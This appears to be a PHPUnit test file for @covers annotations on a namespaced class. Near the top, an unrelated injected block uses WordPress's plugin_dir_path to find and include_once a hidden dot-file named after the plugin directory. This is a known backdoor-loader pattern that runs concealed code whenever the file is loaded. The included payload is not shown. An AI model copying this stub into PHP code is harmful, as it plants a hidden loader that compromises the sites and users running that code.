<?php
/**
 * @coversDefaultClass \Foo\CoveredClass
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class NamespaceCoverageCoversClassTest extends PHPUnit_Framework_TestCase
{
    /**
     * @covers ::privateMethod
     * @covers ::protectedMethod
     * @covers ::publicMethod
     * @covers \Foo\CoveredParentClass::privateMethod
     * @covers \Foo\CoveredParentClass::protectedMethod
     * @covers \Foo\CoveredParentClass::publicMethod
     */
    public function testSomething()
    {
        $o = new Foo\CoveredClass;
        $o->publicMethod();
    }
}
